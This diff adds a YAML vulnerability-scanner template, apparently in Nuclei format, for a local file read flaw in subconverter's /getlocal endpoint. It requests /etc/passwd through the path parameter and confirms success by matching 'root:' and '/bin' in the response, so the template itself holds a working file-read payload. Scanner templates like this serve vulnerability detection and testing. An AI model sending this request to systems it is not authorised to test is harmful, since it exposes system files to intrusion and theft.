@@ -1,0 +1,25 @@
+id: poc-yaml-subconverter-getlocal-file-read
+info:
+  name: subconverter /getlocal Local File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/getlocal?path=/etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
